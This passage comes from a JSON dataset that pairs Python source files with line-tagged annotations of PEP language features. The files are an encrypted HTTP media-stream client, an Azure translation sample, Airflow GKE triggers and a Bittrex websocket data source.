'response=\"{response}\",opaque=\"{opaque}\"'.format(\n                    **self._auth_data\n                ).encode()\n            )\n            headers[b\"Authorization\"] = self._authorization\n            logger.debug(\"Authentication data retrieved\")\n            await self._send_http_request(req_line, headers)\n            data = await self._reader.readuntil(b\"\\r\\n\\r\\n\")\n            res_line, headers_block = data.split(b\"\\r\\n\", 1)\n            _, status_code, _ = parse_http_response(res_line)\n            if status_code != 200:\n                raise HttpStatusCodeException(status_code)\n            res_headers = parse_http_headers(headers_block)\n            if \"Key-Exchange\" not in res_headers:\n                raise KeyExchangeMissingException\n            boundary = None\n            if \"Content-Type\" in res_headers:\n                try:\n                    boundary = filter(\n                        lambda chunk: chunk.startswith(\"boundary=\"),\n                        res_headers[\"Content-Type\"].split(\";\"),\n                    ).__next__()\n                    boundary = boundary.split(\"=\")[1].encode()\n                except Exception:\n                    boundary = None\n            if not boundary:\n                warnings.warn(\n                    \"Server did not provide a multipart/mixed boundary.\"\n                    + \" Assuming default.\"\n                )\n            else:\n                self._device_boundary = boundary\n            self._key_exchange = res_headers[\"Key-Exchange\"]\n            self._aes = AESHelper.from_keyexchange_and_password(\n                self._key_exchange.encode(),\n                self.cloud_password.encode(),\n                self.super_secret_key.encode(),\n            )\n            logger.debug(\"AES key exchange performed\")\n            self._started = True\n            self._response_handler_task = asyncio.create_task(\n                self._device_response_handler_loop()\n            )\n        except Exception:\n            try:\n                self._writer.close()\n            except Exception:\n                pass\n            self._started = False\n            raise\n    async def _send_http_request(\n        self, delimiter: bytes, headers: Mapping[bytes, bytes]\n    ):\n        self._writer.write(delimiter + b\"\\r\\n\")\n        for header, value in headers.items():\n            self._writer.write(b\": \".join((header, value)) + b\"\\r\\n\")\n            await self._writer.drain()\n        self._writer.write(b\"\\r\\n\")\n        await self._writer.drain()\n    async def _device_response_handler_loop(self):\n        logger.debug(\"Response handler is running\")\n        while self._started:\n            session = None\n            seq = None\n            await self._reader.readuntil(self._device_boundary)\n            logger.debug(\"Handling new server response\")\n            headers_block = await self._reader.readuntil(b\"\\r\\n\\r\\n\")\n            headers = parse_http_headers(headers_block)\n            mimetype = headers[\"Content-Type\"]\n            length = int(headers[\"Content-Length\"])\n            encrypted = bool(int(headers[\"X-If-Encrypt\"]))\n            if \"X-Session-Id\" in headers:\n                session = int(headers[\"X-Session-Id\"])\n            if \"X-Data-Sequence\" in headers:\n                seq = int(headers[\"X-Data-Sequence\"])\n            json_data = None\n            data = await self._reader.readexactly(length)\n            if encrypted:\n                ciphertext = data\n                try:\n                    plaintext = self._aes.decrypt(ciphertext)\n                except ValueError as e:\n                    if \"padding is incorrect\" in e.args[0].lower():\n                        e = ValueError(\n                            e.args[0]\n                            + \" - This usually means that\"\n                            + \" the cloud password is incorrect.\"\n                        )\n                    plaintext = e\n                except Exception as e:\n                    plaintext = e\n            else:\n                ciphertext = None\n                plaintext = data\n            if mimetype == \"application/json\":\n                try:\n                    json_data = json.loads(plaintext.decode())\n                    if \"seq\" in json_data:\n                        seq = json_data[\"seq\"]\n                    if \"params\" in json_data and \"session_id\" in json_data[\"params\"]:\n                        session = int(json_data[\"params\"][\"session_id\"])\n                except JSONDecodeError:\n                    logger.warning(\"Unable to parse JSON sent from device\")\n            if (\n                (session is None)\n                and (seq is None)\n                or (\n                    (session is not None)\n                    and (session not in self._sessions)\n                    and (seq is not None)\n                    and (seq not in self._sequence_numbers)\n                )\n            ):\n                logger.warning(\n                    \"Received response with no or invalid session information \"\n                    \"(sequence {}, session {}), can't be delivered\".format(seq, session)\n                )\n                continue\n            queue: Optional[Queue] = None\n            if (\n                (session is not None)\n                and (seq is not None)\n                and (session not in self._sessions)\n                and (seq in self._sequence_numbers)\n            ):\n                queue = self._sequence_numbers.pop(seq)\n                self._sessions[session] = queue\n            elif (session is not None) and (session in self._sessions):\n                queue = self._sessions[session]\n            if queue is None:\n                raise AssertionError(\"BUG! Queue not retrieved and not caught earlier\")\n            response_obj = HttpMediaResponse(\n                seq=seq,\n                session=session,\n                headers=headers,\n                encrypted=encrypted,\n                mimetype=mimetype,\n                ciphertext=ciphertext,\n                plaintext=plaintext,\n                json_data=json_data,\n            )\n            if (\n                seq is not None  \n                and seq % self.window_size == 0\n                and (seq < 2000)\n            ):  \n                data = {\n                    \"type\": \"notification\",\n                    \"params\": {\"event_type\": \"stream_sequence\"},\n                }\n                data = json.dumps(data, separators=(\",\", \":\")).encode()\n                headers = {}\n                headers[b\"X-Session-Id\"] = str(session).encode()\n                headers[b\"X-Data-Received\"] = str(\n                    self.window_size * (seq // self.window_size)\n                ).encode()\n                headers[b\"Content-Length\"] = str(len(data)).encode()\n                logger.debug(\"Sending acknowledgement...\")\n                await self._send_http_request(b\"--\" + self.client_boundary, headers)\n                chunk_size = 4096\n                for i in range(0, len(data), chunk_size):\n                    self._writer.write(data[i : i + chunk_size])\n                    await self._writer.drain()\n            logger.debug(\n                (\n                    \"{} response of type {} processed (sequence {}, session {})\"\n                    \", dispatching to queue {}\"\n                ).format(\n                    \"Encrypted\" if encrypted else \"Plaintext\",\n                    mimetype,\n                    seq,\n                    session,\n                    id(queue),\n                )\n            )\n            await queue.put(response_obj)\n    async def transceive(\n        self,\n        data: str,\n        mimetype: str = \"application/json\",\n        session: int = None,\n        encrypt: bool = False,\n        no_data_timeout=1.0,\n    ) -> Generator[HttpMediaResponse, None, None]:\n        sequence = None\n        queue = None\n        if mimetype != \"application/json\" and session is None:\n            raise ValueError(\"Non-JSON streams must always be bound to a session\")\n        if mimetype == \"application/json\":\n            j = json.loads(data)\n            if \"type\" in j and j[\"type\"] == \"request\":\n                sequence = random.randint(1000, 0x7FFF)\n                j[\"seq\"] = sequence\n            data = json.dumps(j, separators=(\",\", \":\"))\n        if (\n            (sequence is None)\n            and (session is None)\n            or (session is not None and session not in self._sessions)\n        ):\n            raise ValueError(\n                \"Data is not a request and no existing session has been found\"\n            )\n        if session is not None:\n            queue = self._sessions[session]\n        if sequence is not None:\n            queue = asyncio.Queue(128)\n            self._sequence_numbers[sequence] = queue\n        if type(data) == str:\n            data = data.encode()\n        headers = {\n            b\"Content-Type\": mimetype.encode(),\n        }\n        if encrypt:\n            data = self._aes.encrypt(data)\n            headers[b\"X-If-Encrypt\"] = b\"1\"\n        headers[b\"Content-Length\"] = str(len(data)).encode()\n        if mimetype != \"application/json\":\n            headers[b\"X-If-Encrypt\"] = str(\n                int(encrypt)\n            ).encode()  \n            if session is not None:\n                headers[b\"X-Session-Id\"] = str(\n                    session\n                ).encode()  \n        if self.window_size is not None:\n            headers[b\"X-Data-Window-Size\"] = str(self.window_size).encode()\n        await self._send_http_request(b\"--\" + self.client_boundary, headers)\n        chunk_size = 4096\n        for i in range(0, len(data), chunk_size):\n            self._writer.write(data[i : i + chunk_size])\n            await self._writer.drain()\n        self._writer.write(b\"\\r\\n\")\n        await self._writer.drain()\n        logger.debug(\n            (\n                \"{} request of type {} sent (sequence {}, session {})\"\n                \", expecting {} responses from queue {}\"\n            ).format(\n                \"Encrypted\" if encrypt else \"Plaintext\",\n                mimetype,\n                sequence,\n                session,\n                self.window_size + 1,\n                id(queue),\n            )\n        )\n        try:\n            while True:\n                coro = queue.get()\n                if no_data_timeout is not None:\n                    try:\n                        resp: HttpMediaResponse = await asyncio.wait_for(\n                            coro, timeout=no_data_timeout\n                        )\n                    except asyncio.exceptions.TimeoutError:\n                        logger.debug(\n                            \"Server did not send a new chunk in {} sec (sequence {}\"\n                            \", session {}), assuming the stream is over\".format(\n                                no_data_timeout, sequence, session\n                            )\n                        )\n                        break\n                else:\n                    resp: HttpMediaResponse = await coro\n                logger.debug(\"Got one response from queue {}\".format(id(queue)))\n                if resp.session is not None:\n                    session = resp.session\n                if resp.encrypted and isinstance(resp.plaintext, Exception):\n                    raise resp.plaintext\n                yield resp\n        finally:\n            if session in self._sessions:\n                del self._sessions[session]\n    async def __aexit__(self, exc_type, exc_val, exc_tb):\n        await self.close()\n    async def close(self):\n        if self._started:\n            self._started = False\n            self._response_handler_task.cancel()\n            self._writer.close()\n            await self._writer.wait_closed()",
            "patterns": {
                "pep_526": [
                    [
                        42,
                        "self._started: bool = False"
                    ],
                    [
                        43,
                        "self._response_handler_task: Optional[Task] = None"
                    ],
                    [
                        44,
                        "self._auth_data: Mapping[str, str] = {}"
                    ],
                    [
                        45,
                        "self._authorization: Optional[str] = None"
                    ],
                    [
                        47,
                        "self._key_exchange: Optional[str] = None"
                    ],
                    [
                        48,
                        "self._aes: Optional[AESHelper] = None"
                    ],
                    [
                        49,
                        "self._reader: Optional[StreamReader] = None"
                    ],
                    [
                        50,
                        "self._writer: Optional[StreamWriter] = None"
                    ],
                    [
                        51,
                        "self._sequence_numbers: MutableMapping[int, Queue] = {}"
                    ],
                    [
                        52,
                        "self._sessions: MutableMapping[int, Queue] = {}"
                    ],
                    [
                        233,
                        "queue: Optional[Queue] = None"
                    ],
                    [
                        378,
                        "resp: HttpMediaResponse = await coro"
                    ],
                    [
                        366,
                        "resp: HttpMediaResponse = await asyncio.wait_for("
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ],
                    [
                        7,
                        7,
                        "import",
                        "from asyncio import StreamReader, StreamWriter, Task, Queue"
                    ]
                ],
                "pep_525": [
                    [
                        291,
                        387,
                        "async generator",
                        "async def transceive(\n        self,\n        data: str,\n        mimetype: str = \"application/json\",\n        session: int = None,\n        encrypt: bool = False,\n        no_data_timeout=1.0,\n    ) -> Generator[HttpMediaResponse, None, None]:\n        sequence = None\n        queue = None\n        if mimetype != \"application/json\" and session is None:\n            raise ValueError(\"Non-JSON streams must always be bound to a session\")\n        if mimetype == \"application/json\":\n            j = json.loads(data)\n            if \"type\" in j and j[\"type\"] == \"request\":\n                sequence = random.randint(1000, 0x7FFF)\n                j[\"seq\"] = sequence\n            data = json.dumps(j, separators=(\",\", \":\"))\n        if (\n            (sequence is None)\n            and (session is None)\n            or (session is not None and session not in self._sessions)\n        ):\n            raise ValueError(\n                \"Data is not a request and no existing session has been found\"\n            )\n        if session is not None:\n            queue = self._sessions[session]\n        if sequence is not None:\n            queue = asyncio.Queue(128)\n            self._sequence_numbers[sequence] = queue\n        if type(data) == str:\n            data = data.encode()\n        headers = {\n            b\"Content-Type\": mimetype.encode(),\n        }\n        if encrypt:\n            data = self._aes.encrypt(data)\n            headers[b\"X-If-Encrypt\"] = b\"1\"\n        headers[b\"Content-Length\"] = str(len(data)).encode()\n        if mimetype != \"application/json\":\n            headers[b\"X-If-Encrypt\"] = str(\n                int(encrypt)\n            ).encode()  \n            if session is not None:\n                headers[b\"X-Session-Id\"] = str(\n                    session\n                ).encode()  \n        if self.window_size is not None:\n            headers[b\"X-Data-Window-Size\"] = str(self.window_size).encode()\n        await self._send_http_request(b\"--\" + self.client_boundary, headers)\n        chunk_size = 4096\n        for i in range(0, len(data), chunk_size):\n            self._writer.write(data[i : i + chunk_size])\n            await self._writer.drain()\n        self._writer.write(b\"\\r\\n\")\n        await self._writer.drain()\n        logger.debug(\n            (\n                \"{} request of type {} sent (sequence {}, session {})\"\n                \", expecting {} responses from queue {}\"\n            ).format(\n                \"Encrypted\" if encrypt else \"Plaintext\",\n                mimetype,\n                sequence,\n                session,\n                self.window_size + 1,\n                id(queue),\n            )\n        )\n        try:\n            while True:\n                coro = queue.get()\n                if no_data_timeout is not None:\n                    try:\n                        resp: HttpMediaResponse = await asyncio.wait_for(\n                            coro, timeout=no_data_timeout\n                        )\n                    except asyncio.exceptions.TimeoutError:\n                        logger.debug(\n                            \"Server did not send a new chunk in {} sec (sequence {}\"\n                            \", session {}), assuming the stream is over\".format(\n                                no_data_timeout, sequence, session\n                            )\n                        )\n                        break\n                else:\n                    resp: HttpMediaResponse = await coro\n                logger.debug(\"Got one response from queue {}\".format(id(queue)))\n                if resp.session is not None:\n                    session = resp.session\n                if resp.encrypted and isinstance(resp.plaintext, Exception):\n                    raise resp.plaintext\n                yield resp\n        finally:\n            if session in self._sessions:\n                del self._sessions[session]"
                    ]
                ],
                "pep_498v": [
                    [
                        349,
                        359,
                        ".format()"
                    ],
                    [
                        279,
                        288,
                        ".format()"
                    ],
                    [
                        62,
                        64,
                        ".format()"
                    ],
                    [
                        112,
                        117,
                        ".format()"
                    ],
                    [
                        229,
                        230,
                        ".format()"
                    ],
                    [
                        379,
                        379,
                        ".format()"
                    ],
                    [
                        371,
                        374,
                        ".format()"
                    ]
                ]
            }
        },
        "19": {
            "file": "import asyncio\nasync def sample_translation_with_glossaries_async():\n    import os\n    from azure.core.credentials import AzureKeyCredential\n    from azure.ai.documenttranslation.aio import DocumentTranslationClient\n    from azure.ai.documenttranslation import (\n        DocumentTranslationInput,\n        TranslationTarget,\n        TranslationGlossary\n    )\n    endpoint = os.environ[\"AZURE_DOCUMENT_TRANSLATION_ENDPOINT\"]\n    key = os.environ[\"AZURE_DOCUMENT_TRANSLATION_KEY\"]\n    source_container_url = os.environ[\"AZURE_SOURCE_CONTAINER_URL\"]\n    target_container_url = os.environ[\"AZURE_TARGET_CONTAINER_URL\"]\n    glossary_url = os.environ[\"AZURE_TRANSLATION_GLOSSARY_URL\"]\n    client = DocumentTranslationClient(endpoint, AzureKeyCredential(key))\n    inputs = DocumentTranslationInput(\n                source_url=source_container_url,\n                targets=[\n                    TranslationTarget(\n                        target_url=target_container_url,\n                        language_code=\"es\",\n                        glossaries=[TranslationGlossary(glossary_url=glossary_url, file_format=\"TSV\")]\n                    )\n                ]\n            )\n    async with client:\n        job = await client.create_translation_job(inputs=[inputs])  \n        job_result = await client.wait_until_done(job.id)  \n        print(\"Job status: {}\".format(job_result.status))\n        print(\"Job created on: {}\".format(job_result.created_on))\n        print(\"Job last updated on: {}\".format(job_result.last_updated_on))\n        print(\"Total number of translations on documents: {}\".format(job_result.documents_total_count))\n        print(\"\\nOf total documents...\")\n        print(\"{} failed\".format(job_result.documents_failed_count))\n        print(\"{} succeeded\".format(job_result.documents_succeeded_count))\n        doc_results = client.list_all_document_statuses(job_result.id)  \n        async for document in doc_results:\n            print(\"Document ID: {}\".format(document.id))\n            print(\"Document status: {}\".format(document.status))\n            if document.status == \"Succeeded\":\n                print(\"Document location: {}\".format(document.translated_document_url))\n                print(\"Translated to language: {}\\n\".format(document.translate_to))\n            else:\n                print(\"Error Code: {}, Message: {}\\n\".format(document.error.code, document.error.message))\nasync def main():\n    await sample_translation_with_glossaries_async()\nif __name__ == '__main__':\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        38,
                        45,
                        "async for",
                        "async for document in doc_results:\n            print(\"Document ID: {}\".format(document.id))\n            print(\"Document status: {}\".format(document.status))\n            if document.status == \"Succeeded\":\n                print(\"Document location: {}\".format(document.translated_document_url))\n                print(\"Translated to language: {}\\n\".format(document.translate_to))\n            else:\n                print(\"Error Code: {}, Message: {}\\n\".format(document.error.code, document.error.message))"
                    ]
                ],
                "pep_498v": [
                    [
                        30,
                        30,
                        ".format()"
                    ],
                    [
                        31,
                        31,
                        ".format()"
                    ],
                    [
                        32,
                        32,
                        ".format()"
                    ],
                    [
                        33,
                        33,
                        ".format()"
                    ],
                    [
                        35,
                        35,
                        ".format()"
                    ],
                    [
                        36,
                        36,
                        ".format()"
                    ],
                    [
                        39,
                        39,
                        ".format()"
                    ],
                    [
                        40,
                        40,
                        ".format()"
                    ],
                    [
                        42,
                        42,
                        ".format()"
                    ],
                    [
                        43,
                        43,
                        ".format()"
                    ],
                    [
                        45,
                        45,
                        ".format()"
                    ]
                ]
            }
        },
        "20": {
            "file": "from __future__ import annotations\nimport asyncio\nimport warnings\nfrom datetime import datetime\nfrom typing import Any, AsyncIterator, Sequence\nfrom google.cloud.container_v1.types import Operation\nfrom airflow.exceptions import AirflowProviderDeprecationWarning\nfrom airflow.providers.cncf.kubernetes.utils.pod_manager import OnFinishAction\ntry:\n    from airflow.providers.cncf.kubernetes.triggers.pod import KubernetesPodTrigger\nexcept ImportError:\n    from airflow.providers.cncf.kubernetes.triggers.kubernetes_pod import KubernetesPodTrigger\nfrom airflow.providers.google.cloud.hooks.kubernetes_engine import GKEAsyncHook, GKEPodAsyncHook\nfrom airflow.triggers.base import BaseTrigger, TriggerEvent\nclass GKEStartPodTrigger(KubernetesPodTrigger):\n    def __init__(\n        self,\n        pod_name: str,\n        pod_namespace: str,\n        cluster_url: str,\n        ssl_ca_cert: str,\n        base_container_name: str,\n        trigger_start_time: datetime,\n        cluster_context: str | None = None,\n        poll_interval: float = 2,\n        in_cluster: bool | None = None,\n        get_logs: bool = True,\n        startup_timeout: int = 120,\n        on_finish_action: str = \"delete_pod\",\n        should_delete_pod: bool | None = None,\n        *args,\n        **kwargs,\n    ):\n        super().__init__(\n            pod_name,\n            pod_namespace,\n            trigger_start_time,\n            base_container_name,\n            *args,\n            **kwargs,\n        )\n        self.pod_name = pod_name\n        self.pod_namespace = pod_namespace\n        self.trigger_start_time = trigger_start_time\n        self.base_container_name = base_container_name\n        self.poll_interval = poll_interval\n        self.cluster_context = cluster_context\n        self.in_cluster = in_cluster\n        self.get_logs = get_logs\n        self.startup_timeout = startup_timeout\n        if should_delete_pod is not None:\n            warnings.warn(\n                \"`should_delete_pod` parameter is deprecated, please use `on_finish_action`\",\n                AirflowProviderDeprecationWarning,\n            )\n            self.on_finish_action = (\n                OnFinishAction.DELETE_POD if should_delete_pod else OnFinishAction.KEEP_POD\n            )\n            self.should_delete_pod = should_delete_pod\n        else:\n            self.on_finish_action = OnFinishAction(on_finish_action)\n            self.should_delete_pod = self.on_finish_action == OnFinishAction.DELETE_POD\n        self._cluster_url = cluster_url\n        self._ssl_ca_cert = ssl_ca_cert\n    def serialize(self) -> tuple[str, dict[str, Any]]:\n        return (\n            \"airflow.providers.google.cloud.triggers.kubernetes_engine.GKEStartPodTrigger\",\n            {\n                \"pod_name\": self.pod_name,\n                \"pod_namespace\": self.pod_namespace,\n                \"cluster_url\": self._cluster_url,\n                \"ssl_ca_cert\": self._ssl_ca_cert,\n                \"poll_interval\": self.poll_interval,\n                \"cluster_context\": self.cluster_context,\n                \"in_cluster\": self.in_cluster,\n                \"get_logs\": self.get_logs,\n                \"startup_timeout\": self.startup_timeout,\n                \"trigger_start_time\": self.trigger_start_time,\n                \"base_container_name\": self.base_container_name,\n                \"should_delete_pod\": self.should_delete_pod,\n                \"on_finish_action\": self.on_finish_action.value,\n            },\n        )\n    def _get_async_hook(self) -> GKEPodAsyncHook:  \n        return GKEPodAsyncHook(\n            cluster_url=self._cluster_url,\n            ssl_ca_cert=self._ssl_ca_cert,\n        )\nclass GKEOperationTrigger(BaseTrigger):\n    def __init__(\n        self,\n        operation_name: str,\n        project_id: str | None,\n        location: str,\n        gcp_conn_id: str = \"google_cloud_default\",\n        impersonation_chain: str | Sequence[str] | None = None,\n        poll_interval: int = 10,\n    ):\n        super().__init__()\n        self.operation_name = operation_name\n        self.project_id = project_id\n        self.location = location\n        self.gcp_conn_id = gcp_conn_id\n        self.impersonation_chain = impersonation_chain\n        self.poll_interval = poll_interval\n        self._hook: GKEAsyncHook | None = None\n    def serialize(self) -> tuple[str, dict[str, Any]]:\n        return (\n            \"airflow.providers.google.cloud.triggers.kubernetes_engine.GKEOperationTrigger\",\n            {\n                \"operation_name\": self.operation_name,\n                \"project_id\": self.project_id,\n                \"location\": self.location,\n                \"gcp_conn_id\": self.gcp_conn_id,\n                \"impersonation_chain\": self.impersonation_chain,\n                \"poll_interval\": self.poll_interval,\n            },\n        )\n    async def run(self) -> AsyncIterator[TriggerEvent]:  \n        hook = self._get_hook()\n        while True:\n            try:\n                operation = await hook.get_operation(\n                    operation_name=self.operation_name,\n                    project_id=self.project_id,\n                )\n                status = operation.status\n                if status == Operation.Status.DONE:\n                    yield TriggerEvent(\n                        {\n                            \"status\": \"success\",\n                            \"message\": \"Operation is successfully ended.\",\n                            \"operation_name\": operation.name,\n                        }\n                    )\n                    return\n                elif status == Operation.Status.RUNNING or status == Operation.Status.PENDING:\n                    self.log.info(\"Operation is still running.\")\n                    self.log.info(\"Sleeping for %ss...\", self.poll_interval)\n                    await asyncio.sleep(self.poll_interval)\n                else:\n                    yield TriggerEvent(\n                        {\n                            \"status\": \"failed\",\n                            \"message\": f\"Operation has failed with status: {operation.status}\",\n                        }\n                    )\n                    return\n            except Exception as e:\n                self.log.exception(\"Exception occurred while checking operation status\")\n                yield TriggerEvent(\n                    {\n                        \"status\": \"error\",\n                        \"message\": str(e),\n                    }\n                )\n                return\n    def _get_hook(self) -> GKEAsyncHook:\n        if self._hook is None:\n            self._hook = GKEAsyncHook(\n                gcp_conn_id=self.gcp_conn_id,\n                location=self.location,\n                impersonation_chain=self.impersonation_chain,\n            )\n        return self._hook",
            "patterns": {
                "pep_468": [
                    [
                        34,
                        "super().__init__(\n            pod_name,\n            pod_namespace,\n            trigger_start_time,\n            base_container_name,\n            *args,\n            **kwargs,\n        )"
                    ]
                ],
                "pep_526": [
                    [
                        106,
                        "self._hook: GKEAsyncHook | None = None"
                    ]
                ],
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_563": [
                    [
                        1,
                        "from __future__ import annotations",
                        "import"
                    ]
                ],
                "pep_585": [
                    [
                        65,
                        "    def serialize(self) -> tuple[str, dict[str, Any]]:",
                        "error"
                    ],
                    [
                        107,
                        "    def serialize(self) -> tuple[str, dict[str, Any]]:",
                        "error"
                    ]
                ],
                "pep_525": [
                    [
                        119,
                        157,
                        "async generator",
                        "async def run(self) -> AsyncIterator[TriggerEvent]:  \n        hook = self._get_hook()\n        while True:\n            try:\n                operation = await hook.get_operation(\n                    operation_name=self.operation_name,\n                    project_id=self.project_id,\n                )\n                status = operation.status\n                if status == Operation.Status.DONE:\n                    yield TriggerEvent(\n                        {\n                            \"status\": \"success\",\n                            \"message\": \"Operation is successfully ended.\",\n                            \"operation_name\": operation.name,\n                        }\n                    )\n                    return\n                elif status == Operation.Status.RUNNING or status == Operation.Status.PENDING:\n                    self.log.info(\"Operation is still running.\")\n                    self.log.info(\"Sleeping for %ss...\", self.poll_interval)\n                    await asyncio.sleep(self.poll_interval)\n                else:\n                    yield TriggerEvent(\n                        {\n                            \"status\": \"failed\",\n                            \"message\": f\"Operation has failed with status: {operation.status}\",\n                        }\n                    )\n                    return\n            except Exception as e:\n                self.log.exception(\"Exception occurred while checking operation status\")\n                yield TriggerEvent(\n                    {\n                        \"status\": \"error\",\n                        \"message\": str(e),\n                    }\n                )\n                return"
                    ]
                ],
                "pep_498": [
                    [
                        145,
                        "                            \"message\": f\"Operation has failed with status: {operation.status}\","
                    ]
                ]
            }
        },
        "21": {
            "file": "import uuid\nimport asyncio\nimport hashlib\nimport hmac\nimport logging\nimport time\nfrom base64 import b64decode\nfrom typing import AsyncIterable, Dict, Optional, List, Any\nfrom zlib import decompress, MAX_WBITS\nimport signalr_aio\nimport ujson\nfrom async_timeout import timeout\nfrom hummingbot.core.data_type.user_stream_tracker_data_source import UserStreamTrackerDataSource\nfrom hummingbot.connector.exchange.bittrex.bittrex_auth import BittrexAuth\nfrom hummingbot.logger import HummingbotLogger\nBITTREX_WS_FEED = \"https://socket-v3.bittrex.com/signalr\"\nMAX_RETRIES = 20\nMESSAGE_TIMEOUT = 30.0\nNaN = float(\"nan\")\nclass BittrexAPIUserStreamDataSource(UserStreamTrackerDataSource):\n    MESSAGE_TIMEOUT = 30.0\n    PING_TIMEOUT = 10.0\n    _btausds_logger: Optional[HummingbotLogger] = None\n    @classmethod\n    def logger(cls) -> HummingbotLogger:\n        if cls._btausds_logger is None:\n            cls._btausds_logger = logging.getLogger(__name__)\n        return cls._btausds_logger\n    def __init__(self, bittrex_auth: BittrexAuth, trading_pairs: Optional[List[str]] = []):\n        self._bittrex_auth: BittrexAuth = bittrex_auth\n        self._trading_pairs = trading_pairs\n        self._current_listen_key = None\n        self._listen_for_user_stream_task = None\n        self._last_recv_time: float = 0\n        self._websocket_connection: Optional[signalr_aio.Connection] = None\n        self._hub = None\n        super().__init__()\n    @property\n    def hub(self):\n        return self._hub\n    @hub.setter\n    def hub(self, value):\n        self._hub = value\n    @property\n    def last_recv_time(self) -> float:\n        return self._last_recv_time\n    async def _socket_user_stream(self, conn: signalr_aio.Connection) -> AsyncIterable[str]:\n        try:\n            while True:\n                async with timeout(MESSAGE_TIMEOUT):\n                    msg = await conn.msg_queue.get()\n                    self._last_recv_time = time.time()\n                    yield msg\n        except asyncio.TimeoutError:\n            self.logger().warning(f\"Message recv() timed out. Reconnecting to Bittrex SignalR WebSocket... \")\n    def _transform_raw_message(self, msg) -> Dict[str, Any]:\n        def _decode_message(raw_message: bytes) -> Dict[str, Any]:\n            try:\n                decode_msg: bytes = decompress(b64decode(raw_message, validate=True), -MAX_WBITS)\n            except SyntaxError:\n                decode_msg: bytes = decompress(b64decode(raw_message, validate=True))\n            except Exception:\n                self.logger().error(f\"Error decoding message\", exc_info=True)\n                return {\"error\": \"Error decoding message\"}\n            return ujson.loads(decode_msg.decode(), precise_float=True)\n        def _is_heartbeat(msg):\n            return len(msg.get(\"M\", [])) > 0 and type(msg[\"M\"][0]) == dict and msg[\"M\"][0].get(\"M\", None) == \"heartbeat\"\n        def _is_auth_notification(msg):\n            return len(msg.get(\"M\", [])) > 0 and type(msg[\"M\"][0]) == dict and msg[\"M\"][0].get(\"M\", None) == \"authenticationExpiring\"\n        def _is_order_delta(msg) -> bool:\n            return len(msg.get(\"M\", [])) > 0 and type(msg[\"M\"][0]) == dict and msg[\"M\"][0].get(\"M\", None) == \"order\"\n        def _is_balance_delta(msg) -> bool:\n            return len(msg.get(\"M\", [])) > 0 and type(msg[\"M\"][0]) == dict and msg[\"M\"][0].get(\"M\", None) == \"balance\"\n        output: Dict[str, Any] = {\"event_type\": None, \"content\": None, \"error\": None}\n        msg: Dict[str, Any] = ujson.loads(msg)\n        if _is_auth_notification(msg):\n            output[\"event_type\"] = \"re-authenticate\"\n        elif _is_heartbeat(msg):\n            output[\"event_type\"] = \"heartbeat\"\n        elif _is_balance_delta(msg):\n            output[\"event_type\"] = \"balance\"\n            output[\"content\"] = _decode_message(msg[\"M\"][0][\"A\"][0])\n        elif _is_order_delta(msg):\n            output[\"event_type\"] = \"order\"\n            output[\"content\"] = _decode_message(msg[\"M\"][0][\"A\"][0])\n        return output\n    async def listen_for_user_stream(self, ev_loop: asyncio.BaseEventLoop, output: asyncio.Queue):\n        while True:\n            try:\n                self._websocket_connection = signalr_aio.Connection(BITTREX_WS_FEED, session=None)\n                self.hub = self._websocket_connection.register_hub(\"c3\")\n                self.logger().info(\"Authenticating...\")\n                await self.authenticate()\n                self.hub.server.invoke(\"Subscribe\", [\"heartbeat\"])\n                self.hub.server.invoke(\"Subscribe\", [\"order\"])\n                self.hub.server.invoke(\"Subscribe\", [\"balance\"])\n                self._websocket_connection.start()\n                async for raw_message in self._socket_user_stream(self._websocket_connection):\n                    decode: Dict[str, Any] = self._transform_raw_message(raw_message)\n                    if decode.get(\"error\") is not None:\n                        self.logger().error(decode[\"error\"])\n                        continue\n                    if decode.get(\"content\") is not None:\n                        content_type = decode[\"event_type\"]\n                        if content_type in [\"balance\", \"order\"]:  \n                            output.put_nowait(decode)\n                        elif content_type == \"re-authenticate\":\n                            await self.authenticate()\n                        elif content_type == \"heartbeat\":\n                            continue\n            except asyncio.CancelledError:\n                raise\n            except Exception:\n                self.logger().error(\n                    \"Unexpected error with Bittrex WebSocket connection. \" \"Retrying after 30 seconds...\", exc_info=True\n                )\n                await asyncio.sleep(30.0)\n    async def authenticate(self):\n        timestamp = int(round(time.time() * 1000))\n        randomized = str(uuid.uuid4())\n        challenge = f\"{timestamp}{randomized}\"\n        signed_challenge = hmac.new(self._bittrex_auth.secret_key.encode(), challenge.encode(), hashlib.sha512).hexdigest()\n        self.hub.server.invoke(\"Authenticate\", self._bittrex_auth.api_key, timestamp, randomized, signed_challenge)\n        return",
            "patterns": {
                "pep_526": [
                    [
                        23,
                        "_btausds_logger: Optional[HummingbotLogger] = None"
                    ],
                    [
                        30,
                        "self._bittrex_auth: BittrexAuth = bittrex_auth"
                    ],
                    [
                        34,
                        "self._last_recv_time: float = 0"
                    ],
                    [
                        35,
                        "self._websocket_connection: Optional[signalr_aio.Connection] = None"
                    ],
                    [
                        74,
                        "output: Dict[str, Any] = {\"event_type\": None, \"content\": None, \"error\": None}"
                    ],
                    [
                        75,
                        "msg: Dict[str, Any] = ujson.loads(msg)"
                    ],
                    [
                        59,
                        "decode_msg: bytes = decompress(b64decode(raw_message, validate=True), -MAX_WBITS)"
                    ],
                    [
                        61,
                        "decode_msg: bytes = decompress(b64decode(raw_message, validate=True))"
                    ],
                    [
                        99,
                        "decode: Dict[str, Any] = self._transform_raw_message(raw_message)"
                    ]
                ],
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        8,
                        "from typing import AsyncIterable, Dict, Optional, List, Any",
                        "suggestion"
                    ],
                    [
                        8,
                        "from typing import AsyncIterable, Dict, Optional, List, Any",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        56,
                        "    def _transform_raw_message(self, msg) -> Dict[str, Any]:",
                        "violation"
                    ],
                    [
                        57,
                        "        def _decode_message(raw_message: bytes) -> Dict[str, Any]:",
                        "violation"
                    ],
                    [
                        74,
                        "        output: Dict[str, Any] = {\"event_type\": None, \"content\": None, \"error\": None}",
                        "violation"
                    ],
                    [
                        75,
                        "        msg: Dict[str, Any] = ujson.loads(msg)",
                        "violation"
                    ],
                    [
                        99,
